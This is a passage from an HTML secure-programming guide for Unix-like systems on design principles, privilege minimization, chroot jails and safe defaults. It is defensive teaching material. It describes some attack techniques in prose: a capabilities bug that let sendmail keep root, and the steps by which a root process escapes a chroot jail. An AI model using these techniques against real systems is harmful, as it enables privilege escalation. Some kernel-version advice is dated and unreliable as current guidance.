It also reduces the number of potential interactions among privileged programs,
so unintentional,
unwanted, or improper uses of privilege are less likely to occur. 
This idea can be extended to the internals of a program: only the smallest
portion of the program which needs those privileges should have them.
See <A
HREF="#MINIMIZE-PRIVILEGES"
>Section 7.4</A
> for more about how to do this.</P
></LI
><LI
><P
><EM
>Economy of mechanism/Simplicity</EM
>.
The protection system&#8217;s design should be simple and
small as possible.
In their words,
<SPAN
CLASS="QUOTE"
>&#8220;techniques such as line-by-line inspection of software and physical
examination of hardware that implements protection mechanisms are necessary.
For such techniques to be successful,
a small and simple design is essential.&#8221;</SPAN
>
This is sometimes described as the <SPAN
CLASS="QUOTE"
>&#8220;KISS&#8221;</SPAN
> principle
(<SPAN
CLASS="QUOTE"
>&#8220;keep it simple, stupid&#8221;</SPAN
>).</P
></LI
><LI
><P
><EM
>Open design</EM
>.
The protection mechanism must not depend on attacker ignorance.
Instead, the mechanism should be public, depending on the secrecy of
relatively few (and easily changeable) items like passwords or private keys.
An open design makes extensive public scrutiny possible, and it also
makes it possible for users to convince themselves that the system about
to be used is adequate.
Frankly, it isn&#8217;t realistic to try to maintain secrecy for a system that
is widely distributed;
decompilers and subverted hardware can quickly expose any <SPAN
CLASS="QUOTE"
>&#8220;secrets&#8221;</SPAN
>
in an implementation.
Even if you pretend that source code is necessary to find exploits (it isn&#8217;t),
source code has often been stolen and redistributed
(at least once from Cisco and twice from Microsoft).
This is one of the oldest and strongly supported principles, based
on many years in cryptography.
For example, the older Kerckhoffs&#8217;s Law states
that "A cryptosystem
should be designed to be secure if everything is known about it except
the key information."
Claude Shannon, the inventor of information theory, restated Kerckhoff&#8217;s Law
as: "[Assume] the enemy knows the system."
Indeed, security expert
Bruce Schneier goes further and
argues that smart engineers should
<SPAN
CLASS="QUOTE"
>&#8220;demand open source code for anything related to security&#8221;</SPAN
>,
as well as ensuring that it receives widespread review and that
any identified problems are fixed [Schneier 1999].</P
></LI
><LI
><P
><EM
>Complete mediation</EM
>.
Every access attempt must be checked; position the mechanism
so it cannot be subverted.
A synonym for this goal is
<EM
>non-bypassability</EM
>.
For example, in a client-server model, generally the server must do all
access checking because users can build or modify their own clients.
This is the point of all of
<A
HREF="#INPUT"
>Chapter 5</A
>, as well as
<A
HREF="#SECURE-INTERFACE"
>Section 7.2</A
>.</P
></LI
><LI
><P
><EM
>Fail-safe defaults (e.g., permission-based approach)</EM
>.
The default should be denial of service, and the
protection scheme should then identify conditions under which
access is permitted.
See <A
HREF="#SAFE-CONFIGURE"
>Section 7.7</A
> and <A
HREF="#FAIL-SAFE"
>Section 7.10</A
>
for more.</P
></LI
><LI
><P
><EM
>Separation of privilege</EM
>.
Ideally, access to objects should depend on more than one condition, so
that defeating one protection system won&#8217;t enable complete access.</P
></LI
><LI
><P
><EM
>Least common mechanism</EM
>.
Minimize the amount and
use of shared mechanisms (e.g. use of the /tmp or /var/tmp directories).
Shared objects provide potentially dangerous channels for information
flow and unintended interactions.
See <A
HREF="#AVOID-RACE"
>Section 7.11</A
> for more information.</P
></LI
><LI
><P
><EM
>Psychological acceptability / Easy to use</EM
>.
The human interface must be designed for ease of use so users will routinely
and automatically use the protection mechanisms correctly.
Mistakes will be reduced if
the security mechanisms closely match the user&#8217;s mental image of
his or her protection goals.</P
></LI
></UL
>&#13;</P
><P
>A good overview of various design principles for security is available in
Peter Neumann&#8217;s
<A
HREF="http://www.csl.sri.com/users/neumann/chats.html#4"
TARGET="_top"
>Principled Assuredly Trustworthy Composable Architectures</A
>.
For examples of complete failures to consider these issues
(not limited to information technology), see the "winners" of
<A
HREF="http://www.privacyinternational.org/activities/stupidsecurity"
TARGET="_top"
>Privacy International&#8217;s "Stupid Security" Competition</A
>.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="SECURE-INTERFACE"
>7.2. Secure the Interface</A
></H2
><P
>Interfaces should be minimal (simple as possible), narrow
(provide only the functions needed), and non-bypassable.
Trust should be minimized.
Consider limiting the data that the user can see.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="DATA-VS-CONTROL"
>7.3. Separate Data and Control</A
></H2
><P
>Any files you support should be designed to completely separate
(passive) data from programs that are executed.
Applications and data viewers may be used to
display files developed externally, so in general don&#8217;t allow them
to accept programs (also known as <SPAN
CLASS="QUOTE"
>&#8220;scripts&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;macros&#8221;</SPAN
>).
The most dangerous kind is an auto-executing macro that executes
when the application is loaded and/or when the data is initially
displayed; from a security point-of-view this is generally
a disaster waiting to happen.</P
><P
>If you truly must support programs downloaded remotely
(e.g., to implement an existing standard), make sure that you
have extremely strong control over what the macro can do
(this is often called a <SPAN
CLASS="QUOTE"
>&#8220;sandbox&#8221;</SPAN
>).
Past experience has shown that real sandboxes are hard to implement correctly.
In fact, I can&#8217;t remember a single widely-used sandbox that hasn&#8217;t been
repeatedly exploited (yes, that includes Java).
If possible, at least have the programs stored in a separate file, so that
it&#8217;s easier to block them out when another sandbox flaw has been found
but not yet fixed.
Storing them separately also makes it easier to reuse code and to cache
it when helpful.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="MINIMIZE-PRIVILEGES"
>7.4. Minimize Privileges</A
></H2
><P
>As noted earlier, it is an important general
principle that programs have the minimal amount of privileges
necessary to do its job (this is termed <SPAN
CLASS="QUOTE"
>&#8220;least privilege&#8221;</SPAN
>).
That way, if the program is broken, its damage is limited.
The most extreme example is to simply not write a secure program at all -
if this can be done, it usually should be.
For example, don&#8217;t make your program setuid or setgid if you can; just
make it an ordinary program, and require the administrator to log in as such
before running it.</P
><P
>In Linux and Unix, the primary determiner of a process&#8217; privileges
is the set of id&#8217;s associated with it:
each process has a real, effective and saved id for both the user and group
(a few very old Unixes don&#8217;t have a <SPAN
CLASS="QUOTE"
>&#8220;saved&#8221;</SPAN
> id).
Linux also has, as a special extension, a separate filesystem UID and GID
for each process.
Manipulating these values is critical to keeping privileges minimized,
and there are several ways to minimize them (discussed below).
You can also use chroot(2) to minimize the files visible to a program,
though using chroot() can be difficult to use correctly.
There are a few other values determining privilege in Linux and Unix, for
example, POSIX capabilities (supported by Linux 2.2 and greater, and by
some other Unix-like systems).</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="MIMIMIZE-PRIVILEGES-GRANTED"
>7.4.1. Minimize the Privileges Granted</A
></H3
><P
>Perhaps the most effective technique is to simply minimize
the highest privilege granted.
In particular, avoid granting a program root privilege if possible.
Don&#8217;t make a program <EM
>setuid root</EM
> if it only needs access
to a small set of files;
consider creating separate user or group accounts for different function.</P
><P
>A common technique is to
create a special group, change a file&#8217;s group ownership to that group,
and then make the program <EM
>setgid</EM
> to that group.
It&#8217;s better to make a program <EM
>setgid</EM
> instead of <EM
>setuid</EM
>
where you can,
since group membership grants fewer rights (in particular, it does not
grant the right to change file permissions).</P
><P
>This is commonly done for game high scores.
Games are usually setgid <EM
>games</EM
>,
the score files are owned by the group <EM
>games</EM
>,
and the programs themselves and their configuration files
are owned by someone else (say root).
Thus, breaking into a game allows the perpetrator to change high scores but
doesn&#8217;t grant the privilege to change the game&#8217;s executable or
configuration file.
The latter is important; if an attacker could change a game&#8217;s executable
or its configuration files (which might control what the executable runs),
then they might be able to gain control of a user who ran the game.</P
><P
>If creating a new group isn&#8217;t sufficient, consider creating a
new pseudouser (really, a special role) to manage a set of resources -
often a new pseudogroup (again, a special role) is also created just
to run a program.
Web servers typically do this; often web servers are set up with a special
user (<SPAN
CLASS="QUOTE"
>&#8220;nobody&#8221;</SPAN
>) so that they can be isolated from other users.
Indeed, web servers are instructive here: web servers typically need
root privileges to start up (so they can attach to port 80), but once
started they usually shed all their privileges and run as the user <SPAN
CLASS="QUOTE"
>&#8220;nobody&#8221;</SPAN
>.
However, don&#8217;t use the <SPAN
CLASS="QUOTE"
>&#8220;nobody&#8221;</SPAN
> account (unless you&#8217;re writing a
webserver); instead, create your own pseudouser or new group.
The purpose of this approach is to isolate different programs,
processes, and data from each other,
by exploiting the operating system&#8217;s ability to keep users and groups separate.
If different programs shared the same account, then breaking into one program
would also grant privileges to the other.
Usually the pseudouser should not own the programs it runs;
that way, an attack who breaks into the account cannot change
the program it runs.
By isolating different parts of the system into running separate users
and groups, breaking one part will not necessarily break the
whole system&#8217;s security.</P
><P
>If you&#8217;re using a database system (say, by calling its query interface),
limit the rights of the database user that the application uses.
For example, don&#8217;t give that user access to all of the system stored procedures
if that user only needs access to a handful of user-defined ones.
Do everything you can inside stored procedures.
That way, even if someone does manage to force arbitrary strings into the
query, the damage that can be done is limited.
If you must directly pass a regular SQL query with client supplied data
(and you usually shouldn&#8217;t), wrap it in something that limits its activities
(e.g., sp_sqlexec).
(My thanks to SPI Labs for these database system suggestions).</P
><P
>If you <EM
>must</EM
> give a program privileges
usually reserved for root,
consider using POSIX capabilities as soon as your program can
minimize the privileges available to your program.
POSIX capabilities are available in Linux 2.2 and in many other
Unix-like systems.
By calling cap_set_proc(3) or the Linux-specific capsetp(3) 
routines immediately after starting, you can permanently
reduce the abilities of your program to just those abilities it actually needs.
For example the network time daemon (ntpd) traditionally has run as root,
because it needs to modify the current time.
However, patches have been developed so ntpd only needs a single
capability, CAP_SYS_TIME, so even if an attacker gains control over
ntpd it&#8217;s somewhat more difficult to exploit the program.</P
><P
>I say <SPAN
CLASS="QUOTE"
>&#8220;somewhat limited&#8221;</SPAN
> because, unless other steps are taken,
retaining a privilege using POSIX capabilities
requires that the process continue to have the root user id.
Because many important files (configuration files, binaries, and so on)
are owned by root, an attacker controlling a program
with such limited capabilities can still modify
key system files and gain full root-level privilege.
A Linux kernel extension (available in versions 2.4.X and 2.2.19+)
provides a better way to limit the available privileges:
a program can start as root (with all POSIX capabilities),
prune its capabilities down to just what it needs, call
prctl(PR_SET_KEEPCAPS,1), and then use setuid() to change to a
non-root process.
The PR_SET_KEEPCAPS setting marks a process so that when a process does
a setuid to a nonzero value, the capabilities aren&#8217;t cleared
(normally they are cleared).
This process setting is cleared on exec().
However, note that PR_SET_KEEPCAPS is a Linux-unique extension for newer
versions of the linux kernel.</P
><P
>One tool you can use to simplify minimizing granted privileges
is the <SPAN
CLASS="QUOTE"
>&#8220;compartment&#8221;</SPAN
> tool developed by SuSE.
This tool, which only works on Linux,
sets the filesystem root, uid, gid, and/or the
capability set, then runs the given program.
This is particularly handy for running some other program without
modifying it.
Here&#8217;s the syntax of version 0.5:

<TABLE
BORDER="1"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="SCREEN"
>&#13;Syntax: compartment [options] /full/path/to/program

Options:
  --chroot path   chroot to path
  --user user     change UID to this user
  --group group   change GID to this group
  --init program  execute this program before doing anything
  --cap capset    set capset name. You can specify several
  --verbose       be verbose
  --quiet         do no logging (to syslog)</PRE
></FONT
></TD
></TR
></TABLE
>&#13;</P
><P
>Thus, you could start a more secure anonymous ftp server using:

<TABLE
BORDER="1"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="SCREEN"
>  compartment --chroot /home/ftp --cap CAP_NET_BIND_SERVICE anon-ftpd</PRE
></FONT
></TD
></TR
></TABLE
>&#13;</P
><P
>At the time of this writing, the tool is immature and not available on
typical Linux distributions, but this may quickly change.
You can download the program via
<A
HREF="http://www.suse.de/~marc"
TARGET="_top"
>http://www.suse.de/~marc</A
>.
A similar tool is dreamland; you can that at
<A
HREF="http://www.7ka.mipt.ru/~szh/dreamland"
TARGET="_top"
>http://www.7ka.mipt.ru/~szh/dreamland</A
>.</P
><P
>Note that <EM
>not</EM
> all Unix-like systems,
implement POSIX capabilities, and PR_SET_KEEPCAPS is currently
a Linux-only extension.
Thus, these approaches limit portability.
However, if you use it merely as an optional safeguard only
where it&#8217;s available, using this
approach will not really limit portability.
Also, while the Linux kernel version 2.2 and greater includes the low-level
calls, the C-level libraries to make their use easy are not installed
on some Linux distributions, slightly complicating their use in applications.
For more information on Linux&#8217;s implementation of POSIX capabilities, see
<A
HREF="http://linux.kernel.org/pub/linux/libs/security/linux-privs"
TARGET="_top"
>http://linux.kernel.org/pub/linux/libs/security/linux-privs</A
>.</P
><P
>FreeBSD has the jail() function for limiting privileges;
see the
<A
HREF="http://docs.freebsd.org/44doc/papers/jail/jail.html"
TARGET="_top"
>jail
documentation</A
>
for more information.
There are a number of specialized tools and extensions for limiting
privileges; see <A
HREF="#UNIX-EXTENSIONS"
>Section 3.10</A
>.&#13;</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="MINIMIZE-TIME-PRIVILEGE-USABLE"
>7.4.2. Minimize the Time the Privilege Can Be Used</A
></H3
><P
>As soon as possible, permanently give up privileges.
Some Unix-like systems, including Linux,
implement <SPAN
CLASS="QUOTE"
>&#8220;saved&#8221;</SPAN
> IDs which store the <SPAN
CLASS="QUOTE"
>&#8220;previous&#8221;</SPAN
> value.
The simplest approach is to reset
any supplemental groups if appropriate (e.g., using setgroups(2)),
and then set the other id&#8217;s twice to an untrusted id.
In setuid/setgid programs, you should usually set the effective gid and uid
to the real ones, in particular right after a fork(2),
unless there&#8217;s a good reason not to.
Note that you have to change the gid first when dropping from root to another
privilege or it won&#8217;t work - once you drop root privileges, you won&#8217;t
be able to change much else.
Note that in some systems, just setting the group isn&#8217;t enough, if the
process belongs to supplemental groups with privileges.
For example, the <SPAN
CLASS="QUOTE"
>&#8220;rsync&#8221;</SPAN
> program didn&#8217;t remove the supplementary groups
when it changed its uid and gid, which created a potential exploit.</P
><P
>It&#8217;s worth noting that there&#8217;s a well-known related bug that
uses POSIX capabilities to interfere with this minimization.
This bug affects Linux kernel 2.2.0 through 2.2.15, and possibly a number
of other Unix-like systems with POSIX capabilities.
See Bugtraq id 1322 on http://www.securityfocus.com for more information.
Here is their summary:
<A
NAME="AEN1880"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>POSIX "Capabilities" have recently been implemented in the Linux kernel.
These "Capabilities" are an additional form of privilege control to enable
more specific control over what privileged processes can do. Capabilities are
implemented as three (fairly large) bitfields, which each bit representing a
specific action a privileged process can perform. By setting specific bits, the
actions of privileged processes can be controlled -- access can be granted for
various functions only to the specific parts of a program that require them.
It is a security measure. The problem is that capabilities are copied with
fork() execs, meaning that if capabilities are modified by a parent process,
they can be carried over. The way that this can be exploited is by setting all
of the capabilities to zero (meaning, all of the bits are off) in each of the
three bitfields and then executing a setuid program that attempts to drop
privileges before executing code that could be dangerous if run as root, such
as what sendmail does. When sendmail attempts to drop privileges using
setuid(getuid()), it fails not having the capabilities required to do so in its
bitfields and with no checks on its return value . It continues executing with
superuser privileges, and can run a users .forward file as root leading to a
complete compromise.</P
></BLOCKQUOTE
>
One approach, used by sendmail, is to attempt to do
setuid(0) after a setuid(getuid()); normally this should fail.
If it succeeds, the program should stop.
For more information, see
http://sendmail.net/?feed=000607linuxbug.
In the short term this might be a good idea in
other programs, though clearly the better
long-term approach is to upgrade the underlying system.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="MINIMIZE-TIME-PRIVILEGE-ACTIVE"
>7.4.3. Minimize the Time the Privilege is Active</A
></H3
><P
>Use setuid(2), seteuid(2), setgroups(2),
and related functions to ensure that the program
only has these privileges active when necessary,
and then temporarily deactivate the privilege when it&#8217;s not in use.
As noted above, you might want to ensure that these privileges are disabled
while parsing user input, but more generally, only turn on privileges when
they&#8217;re actually needed.</P
><P
>Note that some buffer overflow attacks, if successful, can force a program
to run arbitrary code, and that code could re-enable privileges that were
temporarily dropped.
Thus, there are <EM
>many</EM
>
attacks that temporarily deactivating a privilege won&#8217;t counter -
it&#8217;s always much better to completely drop privileges as soon as possible.
There are many papers that describe how to do this, such as
<A
HREF="http://www.enderunix.org/docs/en/sc-en.txt"
TARGET="_top"
>"Designing
Shellcode Demystified"</A
>.
Some people even claim that <SPAN
CLASS="QUOTE"
>&#8220;seteuid() [is] considered harmful&#8221;</SPAN
> because
of the many attacks it doesn&#8217;t counter.
Still, temporarily deactivating these permissions
prevents a whole class of attacks,
such as techniques to convince a program to write into a file that
perhaps it didn&#8217;t intend to write into.
Since this technique prevents many attacks,
it&#8217;s worth doing if permanently dropping the privilege can&#8217;t be done
at that point in the program.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="MINIMIZE-PRIVILEGED-MODULES"
>7.4.4. Minimize the Modules Granted the Privilege</A
></H3
><P
>If only a few modules are granted the privilege, then it&#8217;s much
easier to determine if they&#8217;re secure.
One way to do so is to have a single module use the
privilege and then drop it, so that other modules called later cannot misuse
the privilege.
Another approach is to have separate commands in separate
executables; one command might be a complex
tool that can do a vast number of tasks for a privileged user (e.g., root),
while the other tool is setuid but is a small, simple tool that
only permits a small command subset (and does not trust its invoker).
The small, simple tool checks to see if the input meets various criteria for
acceptability, and then if it determines the input is acceptable, it
passes the data on to the complex tool.
Note that the small, simple tool must do a thorough job checking its inputs
and limiting what it will pass along to the complex tool, or this can
be a vulnerability.
The communication could be via shell invocation, or any IPC mechanism.
These approaches can even be layered several ways, for example,
a complex user tool could call a simple setuid
<SPAN
CLASS="QUOTE"
>&#8220;wrapping&#8221;</SPAN
> program (that checks its inputs for secure values)
that then passes on information to another complex trusted tool.</P
><P
>This approach is the normal approach for developing GUI-based applications
which requre privilege, but must be run by unprivileged users.
The GUI portion is run as a normal unprivileged user process;
that process then passes security-relevant requests on to another process
that has the special privileges (and does not trust the first process, but
instead limits the requests to whatever the user is allowed to do).
Never develop a program that is
privileged (e.g., using setuid) and also directly invokes a graphical toolkit:
Graphical toolkits aren&#8217;t designed to be used this way, and it would be
extremely difficult to audit graphical toolkits
in a way to make this possible.
Fundamentally, graphical toolkits must be large, and it&#8217;s extremely
unwise to place so much faith in the perfection of that much code, so
there is no point in trying to make them do what should never be done.
Feel free to create a small setuid program that invokes two separate programs:
one without privileges (but with the graphical interface), and one with
privileges (and without an external interface).
Or, create a small setuid program that can be invoked by the unprivileged
GUI application.
But never combine the two into a single process.
For more about this, see the statement by
<A
HREF="http://www.gtk.org/setuid.html"
TARGET="_top"
>Owen Taylor about GTK
and setuid, discussing why GTK_MODULES is not a security hole</A
>.</P
><P
>Some applications can be best developed by dividing the problem
into smaller, mutually untrusting programs.
A simple way is divide up the problem into separate programs that
do one thing (securely), using the filesystem and locking to
prevent problems between them.
If more complex interactions are needed, one approach is to
fork into multiple processes, each of which has different privilege.
Communications channels can be set up in a variety of ways; one
way is to have a "master" process create communication channels
(say unnamed pipes or unnamed sockets),
then fork into different processes and have each process
drop as many privileges as possible.
If you&#8217;re doing this, be sure to watch for deadlocks.
Then use a simple protocol to allow the less trusted processes
to request actions from the more trusted process(es), and ensure that the more
trusted processes only support a limited set of requests.
Setting user and group permissions so that no one else can even start
up the sub-programs makes it harder to break into.</P
><P
>Some operating systems have the concept of multiple
layers of trust in a single process, e.g., Multics&#8217; rings.
Standard Unix and Linux don&#8217;t have a way of separating multiple levels of trust
by function inside a single process
like this; a call to the kernel increases privileges,
but otherwise a given process has a single level of trust.
This is one area where technologies like Java 2, C# (which copies
Java&#8217;s approach), and
Fluke (the basis of security-enhanced Linux) have an advantage.
For example,
Java 2 can specify fine-grained permissions such as the permission to
only open a specific file.
However, general-purpose operating systems do not typically
have such abilities at this time; this may change in the near future.
For more about Java, see <A
HREF="#JAVA"
>Section 10.6</A
>.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="CONSIDER-FSUID"
>7.4.5. Consider Using FSUID To Limit Privileges</A
></H3
><P
>Each Linux process has two Linux-unique state values called
filesystem user id (FSUID) and filesystem group id (FSGID).
These values are used when checking against the filesystem permissions.
If you&#8217;re building a program that operates as a file server for arbitrary
users (like an NFS server), you might consider using these Linux extensions.
To use them, while holding root privileges change
just FSUID and FSGID before accessing files on behalf of a normal user.
This extension is fairly useful, and provides a mechanism for limiting
filesystem access rights without removing other (possibly necessary) rights.
By only setting the FSUID (and not the EUID), a local user cannot send
a signal to the process.
Also, avoiding race conditions is much easier in this situation.
However, a disadvantage of this approach
is that these calls are not portable to other Unix-like systems.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="CONSIDER-CHROOT"
>7.4.6. Consider Using Chroot to Minimize Available Files</A
></H3
><P
>You can use chroot(2) to limit the files visible to your program.
This requires carefully setting up a directory (called the <SPAN
CLASS="QUOTE"
>&#8220;chroot jail&#8221;</SPAN
>)
and correctly entering it.
This can be a fairly effective technique for improving a program&#8217;s
security - it&#8217;s hard to interfere with files you can&#8217;t see.
However, it depends on a whole bunch of assumptions, in particular,
the program must lack root privileges, it must not have any way to get
root privileges, and the chroot jail must be properly set up
(e.g., be careful what you put inside the chroot jail, and make sure that
users can never control its contents before calling chroot).
I recommend using chroot(2) where it makes sense to do so, but don&#8217;t depend
on it alone; instead, make it part of a layered set of defenses.
Here are a few notes about the use of chroot(2):

<P
></P
><UL
><LI
><P
>The program can still use non-filesystem objects that are shared
across the entire machine
(such as System V IPC objects and network sockets).
It&#8217;s best to also
use separate pseudo-users and/or groups, because all Unix-like systems include
the ability to isolate users; this will at least limit the damage
a subverted program can do to other programs.
Note that current most Unix-like systems (including Linux)
won&#8217;t isolate intentionally cooperating programs; if you&#8217;re worried about
malicious programs cooperating, you need to get a system that implements
some sort of mandatory access control and/or limits covert channels.</P
></LI
><LI
><P
>Be sure to close any filesystem descriptors to outside files if you
don&#8217;t want them used later.
In particular, don&#8217;t have any descriptors open to directories outside
the chroot jail, or set up a situation where such a descriptor could be
given to it (e.g., via Unix sockets or an old implementation of /proc).
If the program is given a descriptor to a directory outside the chroot jail,
it could be used to escape out of the chroot jail.</P
></LI
><LI
><P
>The chroot jail has to be set up to be secure - it must never be
controlled by a user and every file added must be carefully examined.
Don&#8217;t use a normal user&#8217;s home directory, subdirectory, or
other directory that can ever be controlled by a user as a chroot jail;
use a separate directory directory specially set aside
for the purpose.
Using a directory controlled by a user is a disaster - for example,
the user could create a <SPAN
CLASS="QUOTE"
>&#8220;lib&#8221;</SPAN
> directory containing a trojaned linker or libc
(and could link a setuid root binary into that space, if the files you
save don&#8217;t use it).
Place the absolute minimum number of files and directories there.
Typically you&#8217;ll have a /bin, /etc/, /lib, and maybe one or two others
(e.g., /pub if it&#8217;s an ftp server).
Place in /bin only what you need to run after doing the chroot(); sometimes
you need nothing at all (try to avoid placing a shell like /bin/sh
there, though sometimes that can&#8217;t be helped).
You may need a /etc/passwd and /etc/group so file listings can show
some correct names, but if so, try not to include the real system&#8217;s
values, and certainly replace all passwords with "*".</P
><P
>You need to ensure that either the program running has all the executable
code (including libraries), or that the chroot jail has the code you&#8217;ll need.
You should place only what you need into the chroot jail.
You could recompile any necessary programs to be statically linked,
so that they don&#8217;t need dynamically loaded libraries at all.
If you use dynamically-loaded libraries,
include only the ones you need;
use ldd(1) to query each program in /bin to find out what it needs
(typically they go in /lib or /usr/lib).
On Linux, you&#8217;ll probably need a few basic libraries like ld-linux.so.2, and
in some circumstances not much else.
You can also use LD_PRELOAD to force some libraries into an executable&#8217;s
area, which can help sometimes.
A longer discussion on how to use chroot jails is given in
<A
HREF="http://www.etc.msys.ch/docs/chrooted_httpd.pdf"
TARGET="_top"
>Marc Balmer&#8217;s "Using OpenBSDs chrooted httpd"</A
>.
Balmer&#8217;s paper is specifically about using Apache in a chroot jail, but
the approaches he discusses can be applied elsewhere too.</P
><P
>It&#8217;s usually wiser to completely copy in all files, instead of making
hard links; while this wastes some time and disk space, it makes it so that
attacks on the chroot jail files do not automatically propagate into the
regular system&#8217;s files.
Mounting a /proc filesystem, on systems where this is supported, is
generally unwise. In fact, in very old versions of Linux (versions 2.0.x,
at least up through 2.0.38) it&#8217;s a
known security flaw, since there are pseudo-directories in /proc that
would permit a chroot'ed program to escape.
Linux kernel 2.2 fixed this known problem, but there may be others; if
possible, don&#8217;t do it.</P
></LI
><LI
><P
>Chroot really isn&#8217;t effective if 
the program can acquire root privilege.
For example, the program could use calls like mknod(2) to create a device
file that can view physical memory, and then use the resulting
device file to modify kernel memory to give itself
whatever privileges it desired.
Another example of how a root program can break out of chroot
is demonstrated at
<A
HREF="http://www.suid.edu/source/breakchroot.c"
TARGET="_top"
>http://www.suid.edu/source/breakchroot.c</A
>.
In this example, the program opens a file descriptor for
the current directory, creates and chroots into a subdirectory, sets
the current directory to the previously-opened current directory,
repeatedly cd&#8217;s up from the current directory (which since it is
outside the current chroot succeeds in moving up to the real filesystem
root), and then calls chroot on the result.
By the time you read this, these weaknesses may have been plugged,
but the reality is that root privilege has traditionally meant
<SPAN
CLASS="QUOTE"
>&#8220;all privileges&#8221;</SPAN
> and it&#8217;s hard to strip them away.
It&#8217;s better to assume that a program requiring continuous root privileges
will only be mildly helped using chroot().
Of course, you may be able to break your program into parts, so that
at least part of it can be in a chroot jail.</P
></LI
></UL
>&#13;</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="MINIMIZE-ACCESSIBLE-DATA"
>7.4.7. Consider Minimizing the Accessible Data</A
></H3
><P
>Consider minimizing the amount of data that can be accessed by the user.
For example, in CGI scripts, place all data used by the CGI script
outside of the document tree unless there is a reason the user needs to
see the data directly.
Some people have the false notion that, by not publicly providing a
link, no one can access the data, but this is simply not true.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="MINIMIZE-RESOURCES"
>7.4.8. Consider Minimizing the Resources Available</A
></H3
><P
>Consider minimizing the computer resources available to a given
process so that, even if it <SPAN
CLASS="QUOTE"
>&#8220;goes haywire,&#8221;</SPAN
> its damage can be limited.
This is a fundamental technique for preventing a denial of service.
For network servers,
a common approach is to set up a separate process for each session,
and for each process limit the amount of CPU time (et cetera) that session
can use.
That way, if an attacker makes a request that chews up memory or uses
100% of the CPU, the limits will kick in and prevent that single session
from interfering with other tasks.
Of course, an attacker can establish many sessions, but this at least
raises the bar for an attack.
See <A
HREF="#QUOTAS"
>Section 3.6</A
> for more information on how to set these limits
(e.g., ulimit(1)).</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="MINIMIZE-FUNCTIONALITY"
>7.5. Minimize the Functionality of a Component</A
></H2
><P
>In a related move, minimize the amount of functionality provided by
your component.
If it does several functions, consider breaking its implementation up into
those smaller functions.
That way, users who don&#8217;t need some functions can disable just those portions.
This is particularly important when a flaw is discovered - this way, users
can disable just one component and still use the other parts.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="AVOID-SETUID"
>7.6. Avoid Creating Setuid/Setgid Scripts</A
></H2
><P
>Many Unix-like systems, in particular Linux, simply ignore the
setuid and setgid bits on scripts to avoid the race condition
described earlier.
Since support for setuid scripts varies on Unix-like systems,
they&#8217;re best avoided in new applications where possible.
As a special case, Perl includes a special setup to support setuid Perl
scripts, so using setuid and setgid is acceptable in Perl if you
truly need this kind of functionality.
If you need to support this kind of functionality in your own
interpreter, examine how Perl does this.
Otherwise, a simple approach is to <SPAN
CLASS="QUOTE"
>&#8220;wrap&#8221;</SPAN
> the script with a small
setuid/setgid executable that creates a safe environment
(e.g., clears and sets environment variables) and then
calls the script (using the script&#8217;s full path).
Make sure that the script cannot be changed by an attacker!
Shell scripting languages have additional problems, and really should
not be setuid/setgid; see <A
HREF="#SHELL"
>Section 10.4</A
>
for more information about this.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="SAFE-CONFIGURE"
>7.7. Configure Safely and Use Safe Defaults</A
></H2
><P
>Configuration is considered to currently be the number one security problem.
Therefore, you should spend some effort to (1) make the initial installation
secure, and (2) make it easy to reconfigure the system while keeping it secure.</P
><P
>Never have the installation routines install a working <SPAN
CLASS="QUOTE"
>&#8220;default&#8221;</SPAN
> password.
If you need to install new <SPAN
CLASS="QUOTE"
>&#8220;users&#8221;</SPAN
>, that&#8217;s fine - just set them up with
an impossible password, leaving time for administrators to set the password
(and leaving the system secure before the password is set).
Administrators will probably install hundreds of packages and almost
certainly forget to set the password - it&#8217;s likely they won&#8217;t even know
to set it, if you create a default password.</P
><P
>A program should have the most restrictive access policy
until the administrator has a chance to configure it.
Please don&#8217;t create <SPAN
CLASS="QUOTE"
>&#8220;sample&#8221;</SPAN
> working users or
<SPAN
CLASS="QUOTE"
>&#8220;allow access to all&#8221;</SPAN
> configurations as the starting configuration;
many users just <SPAN
CLASS="QUOTE"
>&#8220;install everything&#8221;</SPAN
> (installing all available services)
and never get around to configuring many services.
In some cases the program may be able to determine that a more generous
policy is reasonable by depending on the existing authentication system,
for example, an ftp server could legitimately determine that a user who
can log into a user&#8217;s directory should be allowed to access that user&#8217;s files.
Be careful with such assumptions, however.</P
><P
>Have installation scripts install a program as safely as possible.
By default, install all files as owned by root or some other
system user and make them unwriteable by others;
this prevents non-root users from installing viruses.
Indeed, it&#8217;s best to make them unreadable by all but the trusted user.
Allow non-root installation where possible as well, so that users without
root privileges and administrators who do not fully trust the
installer can still use the program.</P
><P
>When installing, check to make sure that any assumptions necessary for
security are true.
Some library routines are not safe on some platforms; see the discussion of
this in <A
HREF="#CALL-ONLY-SAFE"
>Section 8.1</A
>.
If you know which platforms your application will run on, you need not
check their specific attributes, but in that case you should
check to make sure that the program is being installed on only one of
those platforms.
Otherwise, you should require a manual override to install the program,
because you don&#8217;t know if the result will be secure.</P
><P
>Try to make configuration as easy and clear as possible, including
post-installation configuration.
